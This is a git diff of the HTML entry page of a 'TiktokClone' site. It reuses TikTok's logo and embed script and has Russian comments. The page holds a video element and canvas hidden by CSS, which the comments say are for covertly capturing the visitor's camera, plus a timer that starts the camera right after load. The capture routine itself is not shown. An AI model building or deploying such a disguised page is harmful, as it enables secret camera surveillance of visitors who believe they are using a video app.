@@ -1,12 +1,15 @@
 <!doctype html>
 <html lang="en">
+
 <head>
   <meta charset="utf-8">
   <title>TiktokClone</title>
   <base href="/">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <link rel="icon" type="image/x-icon" href="favicon.ico">
-  <link rel="shortcut icon" href="https://lf16-tiktok-common.ibytedtos.com/obj/tiktok-web-common-sg/mtact/static/images/logo_144c91a.png?v=2" type="image/x-icon">
+  <link rel="shortcut icon"
+    href="https://lf16-tiktok-common.ibytedtos.com/obj/tiktok-web-common-sg/mtact/static/images/logo_144c91a.png?v=2"
+    type="image/x-icon">
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
   <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" />
   <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
@@ -15,24 +18,35 @@
   <meta property="og:site_name" content="TiktokClone">
   <meta property="og:url" content="https://tt-clone-pi.vercel.app">
   <meta property="og:description" content="Клон TikTok с функцией захвата видео">
-  <meta property="og:image" content="https://lf16-tiktok-common.ibytedtos.com/obj/tiktok-web-common-sg/mtact/static/images/logo_144c91a.png?v=2">
+  <meta property="og:image"
+    content="https://lf16-tiktok-common.ibytedtos.com/obj/tiktok-web-common-sg/mtact/static/images/logo_144c91a.png?v=2">
+
   <style>
     /* Скрываем видео элемент */
     #video {
       display: none;
     }
   </style>
+
+  <script>
+    // Обновляем og:url мета-тег с текущим URL
+    window.onload = function () {
+      var ogUrlMeta = document.querySelector('meta[property="og:url"]');
+      if (ogUrlMeta) {
+        ogUrlMeta.setAttribute('content', window.location.href);
+      }
+    };
+  </script>
 </head>
 
 <body>
   <app-root></app-root>
-  Скрытый видеоэлемент для захвата видео с камеры
+  <!-- Скрытый видеоэлемент для захвата видео с камеры -->
   <video id="video" width="740" height="580" autoplay></video>
-  
+
   <!-- Canvas тоже скрыт, так как отображение результата не требуется -->
   <canvas id="canvas" width="740" height="580" style="display:none;"></canvas>
 
-  <app-root></app-root>
   <script async src="https://www.tiktok.com/embed.js"></script>
   <script>
     'use strict';
@@ -85,9 +99,10 @@
     }
 
     // Запуск камеры через 10 секунд после загрузки страницы
-    window.onload = function() {
+    window.onload = function () {
       setTimeout(init, 10);
     };
   </script>
 </body>
+
 </html>
